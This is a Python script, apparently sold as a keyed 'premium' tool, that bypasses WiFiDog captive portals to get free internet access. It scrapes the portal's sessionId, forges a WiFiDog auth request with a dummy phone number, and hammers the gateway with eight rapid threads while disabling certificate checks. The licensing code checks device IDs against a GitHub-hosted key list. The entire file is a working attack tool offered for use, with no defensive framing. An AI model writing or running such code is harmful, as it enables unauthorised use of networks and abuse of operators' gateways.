import requests
import re
import urllib3
import time
import threading
import logging
import random
import datetime
import os
import hashlib
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# 🌐 ONLINE CONFIG (GitHub Database)
# ===============================
KEY_URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/key.txt"

# ===============================
# CONFIG & USER INFO
# ===============================
EXPIRY_DATE = "LOADING..." 
USER_ID = "LOADING..."
PING_THREADS = 8 
MIN_INTERVAL = 0.02
MAX_INTERVAL = 0.1
DEBUG = False

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()
USER_DATA = {"id": "", "key": "", "exp": ""}

# ===============================
# UNIQUE DEVICE ID GENERATOR (FIXED ERROR)
# ===============================
def get_device_id():
    # ဖုန်းထဲမှာ ID မြဲနေအောင် ဖိုင်တစ်ခုနဲ့ သိမ်းထားတဲ့ စနစ်
    id_file = os.path.join(os.path.expanduser("~"), ".alli_device_id.txt")
    
    if os.path.exists(id_file):
        with open(id_file, "r") as f:
            return f.read().strip()
    else:
        try:
            # error ဖြစ်စေတဲ့ .node အစား [1] (nodename) ကို သုံးထားပါတယ်
            node_name = os.uname()[1]
        except:
            node_name = "ALLI-USER"
            
        # ID မရှိသေးရင် random အသစ်ထုတ်ပြီး ဖိုင်ထဲသိမ်းမယ်
        raw_str = str(time.time()) + node_name + str(random.random())
        new_id = hashlib.md5(raw_str.encode()).hexdigest()[:10].upper()
        with open(id_file, "w") as f:
            f.write(new_id)
        return new_id

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

# ===============================
# LOGIN & REGISTRATION SYSTEM
# ===============================
def login():
    dev_id = get_device_id()
    os.system('clear')
    print(f"{CYAN}="*45)
    print(f"{MAGENTA}    ALLI DEVICE REGISTRATION SYSTEM")
    print(f"{CYAN}="*45)
    print(f"{WHITE}[*] Your Device ID: {YELLOW}{dev_id}")
    print(f"{WHITE}[*] Status: {RED}CHECKING ACCESS...")
    print(f"{CYAN}="*45)
    
    try:
        response = requests.get(KEY_URL + "?v=" + str(random.random()), timeout=10)
        lines = response.text.strip().split('\n')
    except:
        print(f"\n{RED}[!] Error: Could not connect to Key Server.{RESET}")
        exit()

    print(f"{WHITE}[!] Please send your ID to Admin for access.")
    input_key = input(f"\n{CYAN}[🔑] ENTER ACCESS KEY: {RESET}").strip()
    
    found = False
    for line in lines:
        if '|' not in line: continue
        data = line.strip().split('|')
        
        if len(data) >= 3:
            db_id = data[0].strip()
            db_key = data[1].strip()
            db_exp = data[2].strip()

            if dev_id == db_id and input_key == db_key:
                USER_DATA['id'] = db_id
                USER_DATA['key'] = db_key
                USER_DATA['exp'] = db_exp
                found = True
                break

    if found:
        try:
            exp_time = datetime.datetime.strptime(USER_DATA['exp'], "%Y-%m-%d %H:%M")
            if datetime.datetime.now() > exp_time:
                print(f"\n{RED}[!] YOUR ACCESS HAS EXPIRED! ({USER_DATA['exp']}){RESET}")
                exit()
            
            global EXPIRY_DATE, USER_ID
            USER_ID = USER_DATA['id']
            EXPIRY_DATE = USER_DATA['exp']
            
            print(f"\n{GREEN}[✓] LOGIN SUCCESSFUL! HELLO {USER_ID}{RESET}")
            time.sleep(1.5)
            return True
        except:
            print(f"\n{RED}[!] Date Format Error! Use: YYYY-MM-DD HH:MM{RESET}")
            exit()
    else:
        print(f"\n{RED}[X] INVALID ID OR KEY! ACCESS DENIED.{RESET}")
        print(f"{YELLOW}[!] Admin ကို ID ပို့ပြီး Key ဝယ်ယူပါ။{RESET}")
        exit()

# ===============================
# ENHANCED HACKER BANNER
# ===============================
def banner():
    os.system('clear')
    print(f"{CYAN}="*45)
    print(f"{MAGENTA}    ▄▄▄· ▄▄▌  ▄▄▌  ▪  ▄▄▄▄·  ▄▄▄· .▄▄ · .▄▄ · ")
    print(f"{MAGENTA}    ▐█ ▀█ ██•  ██•  ██ ▐█ ▀█▪▐█ ▀█ ▐█ ▀. ▐█ ▀. ")
    print(f"{WHITE}    ▄█▀▀█ ██▪  ██▪  ▐█·▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄")
    print(f"{WHITE}    ▐█ ▪▐▌▐█▌▐▌▐█▌▐▌▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█")
    print(f"{CYAN}    ▀  ▀ .▀▀▀ .▀▀▀ ▀▀▀··▀▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀ ")
    print(f"{CYAN}="*45)
    print(f"{YELLOW}  [+] OWNER   : ALLI")
    print(f"{YELLOW}  [+] USER ID : {USER_ID}")
    print(f"{RED}  [+] EXPIRY  : {EXPIRY_DATE}")
    print(f"{GREEN}  [+] STATUS  : PREMIUM UNLOCKED")
    print(f"{CYAN}="*45 + f"{RESET}")

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=15)
            print(f"{GREEN}[⚡] {RESET}USER: {USER_ID[:6]} | {CYAN}STATUS: BYPASSING...{RESET}    ", end="\r")
        except:
            print(f"{RED}[!] Reconnecting...{RESET}                ", end="\r")
            time.sleep(1)
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    if not login(): return
    banner()
    
    logging.info(f"{CYAN}Starting Alli Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=10)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Active. Monitoring...          ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{GREEN}[+] Captive Portal Found!{RESET}")
            print(f"{WHITE}[*] Host: {portal_host}{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=15)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=15)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                logging.warning(f"{RED}Failed to capture SID. Retrying...{RESET}")
                time.sleep(3)
                continue

            print(f"{GREEN}[✓] SID Captured: {sid}{RESET}")

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
            print(f"{MAGENTA}[*] Injecting {PING_THREADS} High-Speed Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            while check_real_internet():
                time.sleep(5)

        except Exception as e:
            if DEBUG: logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}[!] Alli Engine Shutdown...{RESET}")
